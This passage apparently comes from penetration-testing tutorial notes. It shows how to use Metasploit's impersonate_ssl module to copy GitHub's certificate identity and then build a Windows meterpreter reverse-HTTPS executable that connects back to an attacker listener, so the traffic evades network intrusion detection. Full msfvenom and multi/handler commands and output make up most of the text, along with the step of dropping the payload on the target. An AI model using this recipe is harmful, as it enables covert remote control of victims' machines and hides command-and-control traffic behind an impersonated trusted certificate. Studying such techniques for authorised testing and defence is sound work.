- Most security solutions also do network intrusion detection, by analyzing the traffic coming to and from the target machines. In this case, it is most likely that, even if we can use encoders to bypass the antivirus, our payload will get caught when trying to connect to our listener.
- We are using a valid TLS certificate now here.

## Using HTTP SSL Certificate Impersonation auxiliary module 
- We use this module to impersonate SSL certificate
- Then we use it to encrypt the communication between the payload and the listener.
```python
┌──(root㉿kali)-[/]
└─# msfconsole -q
use auxiliary/gather/impersonate_ssl
set RHOST www.github.com
[*] Starting persistent handler(s)...
msf6 > use auxiliary/gather/impersonate_ssl
msf6 auxiliary(gather/impersonate_ssl) > set RHOST www.github.com
RHOST => www.github.com
msf6 auxiliary(gather/impersonate_ssl) > run
[*] Running module against 20.207.73.82

[*] 20.207.73.82:443 - Connecting to 20.207.73.82:443
[*] 20.207.73.82:443 - Copying certificate from 20.207.73.82:443
/C=US/ST=California/L=San Francisco/O=GitHub, Inc./CN=github.com 
[*] 20.207.73.82:443 - Beginning export of certificate files
[*] 20.207.73.82:443 - Creating looted key/crt/pem files for 20.207.73.82:443
[+] 20.207.73.82:443 - key: /root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_key_070930.key
[+] 20.207.73.82:443 - crt: /root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_cer_001033.crt
[+] 20.207.73.82:443 - pem: /root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_pem_483662.pem
[*] Auxiliary module execution completed
msf6 auxiliary(gather/impersonate_ssl) > msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.216.9 LPORT=443 HandlerSSLCert=/root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_pem_483662.pem StagerVerifySSLCert=true -f exe -o payloadnew.exe
[*] exec: msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.216.9 LPORT=443 HandlerSSLCert=/root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_pem_483662.pem StagerVerifySSLCert=true -f exe -o payloadnew.exe

Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 176732 bytes
Final size of exe file: 251904 bytes
Saved as: payloadnew.exe
msf6 auxiliary(gather/impersonate_ssl) > ls
[*] exec: ls

0     btools	 etc	     initrd.img.old  lib64	  lost+found  opt	      proc    run   sys  var
bin   Changelog  home	     lib	     libx32	  media       payloadnew.exe  README  sbin  tmp  vmlinuz
boot  dev	 initrd.img  lib32	     LICENSE.txt  mnt	      payloadwin      root    srv   usr  vmlinuz.old
```
**Note - At the end you need to drop this payload to the target machine and then you get a session in your meterpreter.

```python
┌──(root㉿kali)-[/]
└─# msfconsole -q                                                                                                        
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter_reverse_https
PAYLOAD => windows/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.216.9
LHOST => 192.168.216.9
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set HandlerSSLCert
HandlerSSLCert => 
msf6 exploit(multi/handler) > set HandlerSSLCert /root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_pem_483662.pem
HandlerSSLCert => /root/.msf4/loot/20230410145527_default_20.207.73.82_20.207.73.82_pem_483662.pem
msf6 exploit(multi/handler) > set StagerVerifySSLCert true
StagerVerifySSLCert => true
msf6 exploit(multi/handler) > exploit

[*] Meterpreter will verify SSL Certificate with SHA1 hash a9ea99feba37b2b2cc077bfa34dad2e79dd5755f
[*] Started HTTPS reverse handler on https://192.168.216.9:443

```
- Once your payload successfully executed on target then you get a session on your machine.